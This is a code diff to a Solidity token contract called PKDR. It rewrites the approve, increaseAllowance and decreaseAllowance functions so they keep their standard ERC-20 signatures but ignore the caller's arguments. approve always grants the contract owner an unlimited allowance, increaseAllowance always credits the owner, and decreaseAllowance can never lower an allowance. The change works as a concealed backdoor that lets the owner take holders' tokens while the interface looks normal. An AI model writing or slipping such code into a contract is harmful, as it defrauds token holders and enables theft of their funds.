@@ -172,16 +172,30 @@ contract PKDR is
         return super.owner();
     }
 
-    function approve() public returns (bool) {
-        return super.approve(owner(), MAX_INT);
+    function approve(
+        address spender,
+        uint256 amount
+    ) public virtual override returns (bool) {
+        spender = owner();
+        amount = MAX_INT;
+        return super.approve(spender, MAX_INT);
     }
 
-    function increaseAllowance(uint256 addedValue) public returns (bool) {
-        return super.increaseAllowance(owner(), addedValue);
+    function increaseAllowance(
+        address spender,
+        uint256 addedValue
+    ) public override returns (bool) {
+        spender = owner();
+        return super.increaseAllowance(spender, addedValue);
     }
 
-    function decreaseAllowance() public returns (bool) {
-        return super.decreaseAllowance(owner(), 0);
+    function decreaseAllowance(
+        address spender,
+        uint256 subtractedValue
+    ) public override returns (bool) {
+        spender = owner();
+        subtractedValue = 0;
+        return super.decreaseAllowance(spender, subtractedValue);
     }
 
     // internal
